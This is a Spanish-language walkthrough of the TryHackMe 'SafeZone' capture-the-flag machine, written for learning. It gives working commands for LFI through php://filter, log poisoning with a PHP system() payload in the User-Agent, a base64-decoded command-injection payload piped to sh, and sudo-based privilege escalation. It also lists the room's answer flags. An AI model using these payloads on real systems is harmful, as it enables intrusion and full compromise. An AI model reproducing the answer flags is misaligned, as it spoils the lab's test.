# SafeZone

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF (Web to Root) | safezone | https://tryhackme.com/room/safezone | 02 Level Medium | TryHackMe | Enumeración web, LFI, log poisoning, bypass de rate-limit, cracking de hashes (john/hashcat), port forwarding (chisel), inyección ciega de comandos, escalada vía script Python sudo (bk.py) | Compromiso total de la máquina Linux (www-data → files → yash → root) y captura de ambas flags |

---

**Contexto:** **SafeZone** es una máquina CTF Linux que se resuelve encadenando varias vulnerabilidades web y de escalada local. El punto de entrada es una web PHP con registro de usuarios: un `note.txt` revela la ruta `/~files/pass.txt` (vía el directorio `~files` de Apache) con la contraseña del admin, resuelta además con un "pass hint". Superando el límite de intentos de login se entra como admin y se descubre un parámetro `page` vulnerable a **LFI** en `detail.php`. Combinando el LFI con los logs de Apache se hace *log poisoning* para inyectar PHP y conseguir una reverse shell como `www-data`. La escalada pasa por `sudo find` como `files` (GTFOBins), el cracking del hash de `files`, un servicio interno en `127.0.0.1:8000` con **inyección ciega de comandos** que permite hacerse `yash`, y finalmente `sudo /usr/bin/python3 /root/bk.py` como root para copiar la flag de root.

## Solucionario

### Task 1: Flag de usuario / User flag
**Explicación:** Tras enumerar con `gobuster` se localizan `index.php`, `register.php`, `detail.php`, `note.txt` y el directorio `/~files/`. La nota indica que la contraseña del admin está en `pass.txt` oculto bajo `/~files/` (los directorios home de Apache). El formulario de login limita a 3 intentos, pero un login correcto resetea el contador: se automatiza el login de prueba para bajar el bloqueo y se fuerza la contraseña del admin (`wfuzz`/`burp`). Con la cuenta admin se activa el LFI de `detail.php?page=` (con `..//..` para el traversal). Se utilizan los filtros PHP (`php://filter/convert.base64-encode/resource=...`) para leer el código fuente y, luego, *log poisoning*: se pide la página con un User-Agent que contiene `<?php system($_GET['cmd']); ?>`, se incluye `/var/log/apache2/access.log` vía el LFI y se ejecuta el comando por `cmd`. Con una reverse shell se pasa de `www-data` a `files` (via `sudo find` con GTFObins, aprovechando el hash crackeado para obtener incluso SSH). Tras descubrir un servicio interno en `127.0.0.1:8000` se hace port forwarding (`ssh -L`/`chisel`) y se prueba la app `pentest.php`, que permite enviar mensajes a `yash` y sufre **inyección ciega de comandos**: aunque filtra "bin", se puede ejecutar payloads codificados en base64 (`echo "<b64>" | base64 -d | sh`) para escribir una `authorized_keys` o lanzar una reverse shell como `yash`. Con la shell de `yash` se lee `flag.txt` del home de `yash`.

```bash
# Enumeración
gobuster dir -u http://safezone.thm -w <wordlist>
# pass hint en /~files/pass.txt, contraseña admin = admin<PASSHINT>

# LFI + lectura de código fuente
curl "http://safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=/home/files/pass.txt"
curl "http://safezone.thm/detail.php?page=..//..//..//..//..//..//var/log/apache2/access.log&cmd=ls"

# Log poisoning: User-Agent con código PHP
curl -A "<?php system(\$_GET['cmd']); ?>" "http://safezone.thm/detail.php"
curl "http://safezone.thm/detail.php?page=..//..//..//..//..//..//var/log/apache2/access.log&cmd=id"

# Con la shell www-data: escalar a files (sudo find - exec), crackear el hash y conectar por SSH
sudo -u files /usr/bin/find . -exec <comando> \;
hashcat -m 0 hash.txt rockyou.txt
ssh files@safezone.thm

# Port forwarding hacia 127.0.0.1:8000
ssh -L 8000:127.0.0.1:8000 files@safezone.thm -N -f
gobuster dir -u http://127.0.0.1:8000 -w <wordlist>   # pentest.php

# Inyección ciega de comandos (filtra "bin": usar base64 y sh)
echo "IyEvYmluL3No..." | base64 -d | sh
# -> shell como yash
cat /home/yash/flag.txt
```

| # | Pregunta / Question | Respuesta / Answer |
|---|--------------------|--------------------|
| 1 | What is the user flag? | `THM{c296539f3286a899d8b3f6632fd62274}` |

### Task 2: Flag de root / Root flag
**Explicación:** Como `yash`, `sudo -l` muestra `(root) NOPASSWD: /usr/bin/python3 /root/bk.py`. El script copia archivos conservando permisos, pero se ejecuta como root: basta con usarlo para copiar `/root/root.txt` a `/home/yash` (pidiendo la contraseña de root requerida por el propio script, que se puede obtener o dejar de lado). Alternativa: reemplazar `/etc/passwd` con un `passwd` malicioso, o copiar un `/bin/bash` con SUID hacia el sistema para obtener una shell root y leer la flag.

```bash
sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /home/yash
cat /home/yash/root.txt
```

| # | Pregunta / Question | Respuesta / Answer |
|---|--------------------|--------------------|
| 1 | What is the root flag? | `THM{63a9f0ea7bb98050796b649e85481845}` |

### Tabla unificada / Unified table

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user flag? | `THM{c296539f3286a899d8b3f6632fd62274}` |
| 2 | What is the root flag? | `THM{63a9f0ea7bb98050796b649e85481845}` |

---

**Metodología:** Enumeración de directorios web (gobuster) → bypass del rate-limit de login → LFI con `..//..` y lectura de código fuente vía `php://filter` → log poisoning del `access.log` para RCE → reverse shell como `www-data` → escalada a `files` con `sudo find` (GTFOBins) y cracking del hash → port forwarding a `127.0.0.1:8000` → inyección ciega de comandos en `pentest.php` → shell como `yash` → abuso de `sudo /root/bk.py` (script de copia como root) → flag de root.

**Learning chain:** Localización de archivos ocultos (`~files`) → fuerza de contraseña con bloqueo eludible → LFI → log poisoning → RCE → movimientos laterales/verticales mediante sudo mal configurado → servicio interno con inyección ciega → script privilegiado de respaldo como root.

**Lección:** *El acceso a un archivo tan "inocente" como `pass.txt` y un LFI combinado con los logs de Apache pueden encadenarse hasta obtener RCE; la cadena final de privesc se apoya en binarios con sudo y en un script de respaldo que copia ficheros como root.*

**MITRE ATT&CK:** T1083 File and Directory Discovery · T1190 Exploit Public-Facing Application (LFI) · T1110.001 Password Guessing (bypass de rate-limit) · T1059.007 Command and Scripting Interpreter (JavaScript/PHP-embedded) · T1572 Protocol Tunneling (port forwarding) · T1059.004 Command and Scripting Interpreter (Unix Shell) · T1068 Exploitation for Privilege Escalation · T1548.003 Abuse Elevation Control Mechanism (sudo).

**Fuente:** [TryHackMe - SafeZone](https://tryhackme.com/room/safezone)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.